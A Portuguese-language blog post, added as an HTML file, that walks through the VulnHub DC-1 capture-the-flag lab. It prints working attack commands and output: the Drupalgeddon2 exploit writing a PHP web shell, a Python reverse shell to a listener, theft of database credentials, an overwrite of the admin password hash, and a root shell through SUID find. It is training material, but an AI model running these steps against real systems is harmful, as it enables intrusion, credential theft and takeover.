@@ -1,0 +1,386 @@
+<!-- This is an automatically generated file, do not edit it directly -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <title>CTF #01 - Exploração do laboratório DC-1</title>
+  <meta charset="UTF-8">
+  
+  <!-- SEO -->
+  <meta name="author" content="Danilo Maia Florenzano">
+  <meta name="description" content="Aplicação de técnicas de enumeração e execução de exploits para conseguir <code>reverse shell</code>, captura de credenciais, e elevação de privilégio em Linux. O post não evidencia todo o processo que executei, apenas os que trouxeram resultados relevantes para a captura das <i>flags</i>.">
+  <meta property="og:title" content="CTF #01 - Exploração do laboratório DC-1">
+  <meta property="og:description" content="Aplicação de técnicas de enumeração e execução de exploits para conseguir <code>reverse shell</code>, captura de credenciais, e elevação de privilégio em Linux. O post não evidencia todo o processo que executei, apenas os que trouxeram resultados relevantes para a captura das <i>flags</i>.">
+  <meta property="og:site_name" content="Danilo Maia Florenzano">
+  <meta property="og:url" content="https://daniloflorenzano.github.io/posts/CTF-01-DC-1">
+  <meta property="og:image" content="https://daniloflorenzano.github.io/card.jpg"/>
+  <meta property="og:type" content="Website"/>
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="627" />
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:site" content="Danilo Maia Florenzano">
+  <meta name="twitter:creator" content="Danilo Maia Florenzano">
+  <meta name="twitter:title" content="CTF #01 - Exploração do laboratório DC-1">
+  <meta name="twitter:description" content="Aplicação de técnicas de enumeração e execução de exploits para conseguir <code>reverse shell</code>, captura de credenciais, e elevação de privilégio em Linux. O post não evidencia todo o processo que executei, apenas os que trouxeram resultados relevantes para a captura das <i>flags</i>.">
+  <meta name="twitter:image:src" content="https://daniloflorenzano.github.io/card.jpg">
+  <!--  -->
+
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="Content-Language" content="pt-BR">
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <link rel="icon" href="../../favicon.png">
+  <link href="https://unpkg.com/plume-css@1.0.13/lib/plume-all.css" rel="stylesheet" rel="preload" as="style" media="all" defer>
+  <link rel="stylesheet" href="https://unpkg.com/1post@1.0.3/themes/wooden-theme.css">
+  <link href="https://unpkg.com/prismjs@1.28.0/themes/prism-twilight.min.css" rel="stylesheet" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Ubuntu&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --pm-paragraph-font-size: 1.2em;
+      --pm-font-family-primary: 'Ubuntu', sans-serif;
+      --pm-paragraph-font-family:'Ubuntu', sans-serif;
+    }
+
+    .plume .pm-link, .plume a {
+      font-size: var(--pm-paragraph-font-size);
+      font-family: var(--pm-font-family-primary);
+    }
+    .destaque {
+				color: rgb(18 255 124);
+		}
+  </style>  
+</head>
+<body class="plume">
+  <div class="pm-container">
+    <h1>CTF #01 - Exploração do laboratório DC-1</h1>
+
+    <p>
+      <a href="../..">← ← ←</a> &nbsp; 
+      28/03/2026, 11:10:48 | <strong>Postado por:</strong>
+      <a href="https://www.linkedin.com/in/daniloflorenzano/" target="_blank" rel="noreferrer noopener">Danilo Maia Florenzano</a>
+    </p>
+
+    <hr>
+
+    
+
+<h2 id="laboratório-dc-1">Laboratório DC-1</h2>
+<blockquote>
+<p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.</p>
+<p>It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.</p>
+</blockquote>
+<p>O laboratório pode ser configurado usando VirtualBox. A imagem para download está disponível no repositório da <a target="_blank" href="https://www.vulnhub.com/entry/dc-1,292/">VulnhHub</a>.</p>
+<p>Para a exploração, considere uma máquina Kali Linux.
+Se necessário, veja <a href="https://daniloflorenzano.com.br/posts/kali-linux-no-docker/" target="_blank">Kali Linux no Docker</a>.</p>
+<h2 id="reconhecimento">Reconhecimento</h2>
+<h3 id="identificar-a-máquina-na-rede-local-com-netdiscover">Identificar a máquina na rede local com <code>netdiscover</code>:</h3>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[~]
+└─# netdiscover -r 192.168.0.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+ 9 Captured ARP Req/Rep packets, from 9 hosts.   Total size: 522
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+ -----------------------------------------------------------------------------
+ ...
+ ...
+ 192.168.0.119   08:00:27:ca:79:73      1      42  PCS Systemtechnik GmbH
+</code></pre>
+<hr>
+<h3 id="identificar-as-portas-expostas-com-nmap">Identificar as portas expostas com <code>nmap</code>:</h3>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[~]
+└─# nmap -sV 192.168.0.119
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-28 14:30 +0000
+Nmap scan report for 192.168.0.119
+Host is up (0.00016s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
+111/tcp open  rpcbind 2-4 (RPC #100000)
+MAC Address: 08:00:27:CA:79:73 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>O resultado no <code>nmap</code> evidencia uma aplicação web na porta 80.</p>
+<hr>
+<h3 id="identificar-aplicação-web">Identificar aplicação web:</h3>
+<p><img 
+  src="drupal-home-page.png"
+  alt="Pagina inicial Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<p>A aplicação web executando na porta 80 é um servidor Drupal, um CMS, assim como Wordpress. Com a extensão Wappalyzer, é possível identificar que a versão sendo executada é a 7. </p>
+<hr>
+<h3 id="enumerar-exploits-com-searchsploit">Enumerar <em>exploits</em> com <code>searchsploit</code>:</h3>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[~]
+└─# searchsploit drupal 7
+---------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                          |  Path
+---------------------------------------------------------------------------------------- ---------------------------------
+...
+...
+Drupal &lt; 7.58 / &lt; 8.3.9 / &lt; 8.4.6 / &lt; 8.5.1 - &#39;Drupalgeddon2&#39; Remote Code Execution     | php/webapps/44449.rb
+</code></pre>
+<p>O <code>searchsploit</code> retorna diversos <em>exploits</em>, porém reduzi a lista para evidenciar o que escolhi utilizar.</p>
+<h2 id="execução">Execução</h2>
+<h3 id="obter-pseudo-shell-com-o-exploit-drupalgeddon2">Obter <em>pseudo shell</em> com o exploit Drupalgeddon2:</h3>
+<pre><code class="language-bash">mkdir dc1 &amp;&amp; cd dc1/
+searchsploit -m php/webapps/44449.rb
+</code></pre>
+<p>A execução do script abre um <em>pseudo shell</em> e com ele já permite a captura da <strong>primeira bandeira</strong>.</p>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[/home/dc1]
+└─# ruby 44449.rb http://192.168.0.119
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://192.168.0.119/
+--------------------------------------------------------------------------------
+[!] MISSING: http://192.168.0.119/CHANGELOG.txt    (HTTP Response: 404)
+[!] MISSING: http://192.168.0.119/core/CHANGELOG.txt    (HTTP Response: 404)
+[+] Found  : http://192.168.0.119/includes/bootstrap.inc    (HTTP Response: 403)
+[!] MISSING: http://192.168.0.119/core/includes/bootstrap.inc    (HTTP Response: 404)
+[+] Found  : http://192.168.0.119/includes/database.inc    (HTTP Response: 403)
+[+] URL    : v7.x/6.x?
+[+] Found  : http://192.168.0.119/    (HTTP Response: 200)
+[+] Metatag: v7.x/6.x [Generator]
+[!] MISSING: http://192.168.0.119/    (HTTP Response: 200)
+[+] Drupal?: v7.x/6.x
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Clean URLs
+[+] Result : Clean URLs enabled
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo UFANATCP
+[+] Result : UFANATCP
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://192.168.0.119/shell.php)
+[!] Response: HTTP 200 // Size: 7.   ***Something could already be there?***
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) { system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl &#39;http://192.168.0.119/shell.php&#39; -d &#39;c=hostname&#39;
+DC-1&gt;&gt; ls | grep flag
+flag1.txt
+DC-1&gt;&gt; cat flag1.txt
+Every good CMS needs a config file - and so do you.
+</code></pre>
+<blockquote>
+<p>Every good CMS needs a config file - and so do you.</p>
+</blockquote>
+<p>Uma característica do DC-1 é que as bandeiras fornecem orientações dos próximos passos.</p>
+<hr>
+<h3 id="melhorar-o-shell-com-netcat">Melhorar o <em>shell</em> com <em>netcat</em>:</h3>
+<p>Antes de ir atrás do arquivo de configuração, uma opção válida é melhorar o <em>shell</em>.</p>
+<p>Na máquina Kali:</p>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[/]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+</code></pre>
+<p>Na máquina DC-1</p>
+<pre><code class="language-bash">python -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.0.9&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#39;
+</code></pre>
+<p>O script Python executado na DC-1 eu obtive no portal <a target="_blank" href="https://gtfobins.org/gtfobins/python/#reverse-shell">GTFObins</a>. </p>
+<p>Ao reproduzir, é importante alterar o IP de connect pelo IP da sua máquina Kali (a minha, no momento, era 192.168.0.9).</p>
+<p>O <em>reverse shell</em> será aberto na máquina Kali:</p>
+<pre><code class="language-bash">┌──(root㉿omarchy)-[/]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.0.9] from (UNKNOWN) [192.168.0.119] 44257
+www-data@DC-1:/var/www$ ls
+ls
+COPYRIGHT.txt       MAINTAINERS.txt  includes     robots.txt  web.config
+INSTALL.mysql.txt   README.txt       index.php    scripts     xmlrpc.php
+INSTALL.pgsql.txt   UPGRADE.txt      install.php  shell.php
+INSTALL.sqlite.txt  authorize.php    misc         sites
+INSTALL.txt         cron.php         modules      themes
+LICENSE.txt         flag1.txt        profiles     update.php
+www-data@DC-1:/var/www$
+</code></pre>
+<h3 id="capturar-credenciais-do-mysql">Capturar credenciais do MySQL:</h3>
+<p>No Drupal, as credenciais do banco de dados está no arquivo de configurações, que por padrão fica no diretório <code>/var/www/sites/default</code>.</p>
+<p>Além das credenciais, no arquivo se encontra a <strong>segunda bandeira</strong>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ cd /var/www/sites/default/
+www-data@DC-1:/var/www/sites/default$ ls
+ls
+default.settings.php  files  settings.php
+www-data@DC-1:/var/www/sites/default$ cat settings.php
+cat settings.php
+&lt;?php
+
+/**
+ *
+ * flag2
+ * Brute force and dictionary attacks aren&#39;t the
+ * only ways to gain access (and you WILL need access).
+ * What can you do with these credentials?
+ *
+ */
+
+$databases = array (
+  &#39;default&#39; =&gt;
+  array (
+    &#39;default&#39; =&gt;
+    array (
+      &#39;database&#39; =&gt; &#39;drupaldb&#39;,
+      &#39;username&#39; =&gt; &#39;dbuser&#39;,
+      &#39;password&#39; =&gt; &#39;R0ck3t&#39;,
+      &#39;host&#39; =&gt; &#39;localhost&#39;,
+      &#39;port&#39; =&gt; &#39;&#39;,
+      &#39;driver&#39; =&gt; &#39;mysql&#39;,
+      &#39;prefix&#39; =&gt; &#39;&#39;,
+    ),
+  ),
+);
+...
+</code></pre>
+<blockquote>
+<p>Brute force and dictionary attacks aren&#39;t the only ways to gain access (and you WILL need access). What can you do with these credentials?</p>
+</blockquote>
+<hr>
+<h3 id="alterar-credenciais-de-administrador-do-drupal">Alterar credenciais de administrador do Drupal:**</h3>
+<p>As credenciais de usuário do Drupal ficam na tabela <code>users</code>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -pR0ck3t drupaldb
+mysql&gt; select name, pass from users;
+select name, pass from users;
++-------+---------------------------------------------------------+
+| name  | pass                                                    |
++-------+---------------------------------------------------------+
+|       |                                                         |
+| admin | $S$Dowp8Hu5SUTSG1FOc/zHfsdCWVgKIHnD1ZgcUYdHpC9NQtwLasEu |
+| Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |
++-------+---------------------------------------------------------+
+
+mysql&gt; exit
+exit
+Bye
+</code></pre>
+<p>Não é possível utilizar a senha dessa forma, pois sofreu processo de <em>hashing</em>. O que pode ser feito é criar uma nova senha, passar ela pelo exato mesmo processo de <em>hashing</em> e alterar o registro no banco com o novo <em>hash</em>.</p>
+<p>Tendo acesso ao servidor do Drupal, esse processo é simples. O script utilizado para fazer o processo de <em>hashing</em> fica no diretório <code>/var/www/scripts/</code>.</p>
+<p>Dado a como o script foi desenvolvido, é necessário que seja executado do diretório <code>/var/www/</code>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www/sites/default$ cd /var/www/scripts/
+cd /var/www/scripts/
+www-data@DC-1:/var/www/scripts$ ls
+ls
+code-clean.sh  drupal.sh            generate-d6-content.sh  run-tests.sh
+cron-curl.sh   dump-database-d6.sh  generate-d7-content.sh  test.script
+cron-lynx.sh   dump-database-d7.sh  password-hash.sh
+www-data@DC-1:/var/www/scripts$ cd ..
+cd ..
+www-data@DC-1:/var/www$ php scripts/password-hash.sh novasenha
+php scripts/password-hash.sh novasenha
+
+password: novasenha             hash: $S$D2rtDg4oSMooJimjyyNn93nXK/f5emudOSGuWPFfPMZRsKMxpuTX
+</code></pre>
+<p>Com o <em>hash</em> da nova senha em mãos, basta alterar o registro no banco de dados.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ mysql -u dbuser -pR0ck3t drupaldb
+mysql -u dbuser -pR0ck3t drupaldb
+
+mysql&gt; UPDATE users SET pass = &#39;$S$D2rtDg4oSMooJimjyyNn93nXK/f5emudOSGuWPFfPMZRsKMxpuTX&#39; WHERE name = &#39;admin&#39;;
+UPDATE users SET pass = &#39;$S$D2rtDg4oSMooJimjyyNn93nXK/f5emu&lt;s = &#39;$S$D2rtDg4oSMooJimjyyNn93nXK/f5emudOSGuWPFfPMZ       &lt;Nn93nXK/f5emudOSGuWPFfPMZRsKMxpuTX&#39; WHERE name = &#39;a       dmin&#39;;
+Query OK, 1 row affected (0.01 sec)
+Rows matched: 1  Changed: 1  Warnings: 0
+
+mysql&gt; exit
+exit
+Bye
+</code></pre>
+<hr>
+<h3 id="acessar-drupal-como-administrador">Acessar Drupal como administrador:</h3>
+<p>Com as credenciais alteradas, basta <em>logar</em> com &quot;admin&quot; e &quot;novasenha&quot;.</p>
+<p><img 
+  src="drupal-admin.png"
+  alt="Pagina de usuario admin do Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<p>Em <code>http://192.168.0.119/node/2#overlay-context=node&amp;overlay=admin/content</code> se encontra a <strong>terceira bandeira</strong>.</p>
+<p><img 
+  src="drupal-content.png"
+  alt="Pagina de conteudo Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<p><img 
+  src="drupal-third-flag.png"
+  alt="Pagina de conteudo da terceira flag Drupal"
+  width="100%"
+  height="100%"
+/></p>
+<blockquote>
+<p>Special PERMS will help FIND the passwd - but you&#39;ll need to -exec that command to work out how to get what&#39;s in the shadow.</p>
+</blockquote>
+<hr>
+<h3 id="escalar-privilégio-com-find">Escalar privilégio com <code>find</code>:</h3>
+<p>As palavras em caixa alta e o argumento <code>-exec</code> da terceira bandeira dá a direção.</p>
+<p>Ao enumerar os executaveis que conseguem performar ações com permissão de super usuário (SUIDs), assim como indicado pela bandeira, <code>find</code> aparece na lista.</p>
+<blockquote>
+<p>SUIDs (files &amp; programs that have the permission of their owner -- usually root. Useful for privilege escalation)</p>
+</blockquote>
+<p>O comando para executar essa enumeração eu consegui em <a target="_blank" href="https://cyberlab.pacific.edu/resources/linux-enumeration-cheat-sheet">Linux Enumeration Cheat Sheet</a>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ find / -perm -4000 -user root -exec ls -ld {} \; 2&gt; /dev/null
+&lt;d / -perm -4000 -user root -exec ls -ld {} \; 2&gt; /d       ev/null
+-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount
+-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping
+-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su
+-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6
+-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount
+-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd
+-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail
+-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
+-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4
+-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown
+-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs
+</code></pre>
+<p>Confirmada a presença do <code>find</code> na lista, basta a execução do comando para criar o shell com permissão de <em>root</em>.</p>
+<p>O comando encontrei em <a target="_blank" href="https://gtfobins.org/gtfobins/find/#shell">GTFObins</a>.</p>
+<pre><code class="language-bash">www-data@DC-1:/var/www$ find . -exec /bin/sh \; -quit
+find . -exec /bin/sh \; -quit
+# whoami
+whoami
+root
+</code></pre>
+<p>A <strong>última bandeira</strong> se encontra no diretório <code>/root/</code>.</p>
+<pre><code class="language-bash"># ls /root
+ls /root
+thefinalflag.txt
+# cat /root/thefinalflag.txt
+cat /root/thefinalflag.txt
+Well done!!!!
+
+Hopefully you&#39;ve enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
+</code></pre>
+<blockquote>
+<p>Hopefully you&#39;ve enjoyed this and learned some new skills.</p>
+<p>You can let me know what you thought of this little journey by contacting me via Twitter - @DCAU7</p>
+</blockquote>
+<hr>
+<h2 id="conclusão">Conclusão</h2>
+<p>DC-1 foi meu primeiro CTF e tive uma experiência positiva com o laboratório. As orientações deixadas pelo autor em cada bandeira ditam o próximo passo, mas não de maneira óbvia, o que provoca a curiosidade de entender a pista e extrair dela o caminho para a próxima exploração.</p>
+
+
+  </div>
+
+  <!-- Prism Code Highlighting -->
+  <script src="https://unpkg.com/prismjs@1.28.0/components/prism-core.min.js"></script>
+	<script src="https://unpkg.com/prismjs@1.28.0/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+</html>
